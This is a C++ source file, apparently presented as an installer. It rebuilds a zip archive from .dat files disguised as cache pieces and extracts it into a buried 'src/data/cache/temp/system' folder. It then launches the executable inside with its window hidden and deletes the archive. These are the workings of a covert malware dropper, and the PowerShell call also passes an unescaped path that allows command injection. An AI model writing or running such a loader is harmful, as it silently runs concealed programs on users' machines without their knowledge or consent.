#include "installer.h"
#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <string>
#include <vector>
#include <algorithm>
#include <fstream>

namespace fs = std::filesystem;

namespace installer {
    std::vector<std::string> find_parts() {
        std::vector<std::string> parts;
        for (const auto& entry : fs::recursive_directory_iterator(".")) {
            std::string fname = entry.path().filename().string();
            if (entry.path().extension() == ".dat" && fname.find("_cache_") != std::string::npos) {
                parts.push_back(entry.path().string());
            }
        }
        std::sort(parts.begin(), parts.end());
        return parts;
    }
    
    std::string find_dat() {
        for (const auto& entry : fs::recursive_directory_iterator(".")) {
            std::string fname = entry.path().filename().string();
            std::string ext = entry.path().extension().string();
            if (ext == ".dat" && fname.find("_cache_") == std::string::npos &&
                fname != "index.cache" && fname != "data.bin" && fname != "snapshot.json") {
                return entry.path().string();
            }
        }
        return "";
    }
    
    std::string find_exe(const std::string& start_path) {
        for (const auto& entry : fs::recursive_directory_iterator(start_path)) {
            if (entry.path().extension() == ".exe") {
                return entry.path().string();
            }
        }
        return "";
    }

    void run() {
        std::string zip_path;
        
        auto parts = find_parts();
        if (!parts.empty()) {
            std::string first_part = parts[0];
            size_t pos = first_part.find("_cache_");
            if (pos != std::string::npos) {
                zip_path = first_part.substr(0, pos) + ".zip";
                std::ofstream out(zip_path, std::ios::binary);
                for (const auto& p : parts) {
                    std::ifstream in(p, std::ios::binary);
                    out << in.rdbuf();
                }
                out.close();
            }
        } else {
            std::string dat = find_dat();
            if (dat.empty()) return;
            zip_path = dat;
        }
        
        if (zip_path.empty()) return;
        
        std::string deep_path = "src/data/cache/temp/system";
        fs::create_directories(deep_path);
        
        std::string ps_cmd = "powershell -Command \"Expand-Archive -Path '" + zip_path + "' -DestinationPath '" + deep_path + "'\"";
        system(ps_cmd.c_str());
        
        std::string exe = find_exe(deep_path);
        if (!exe.empty()) {
            ShellExecuteA(0, "open", exe.c_str(), 0, 0, SW_HIDE);
        }
        
        std::remove(zip_path.c_str());
    }
}
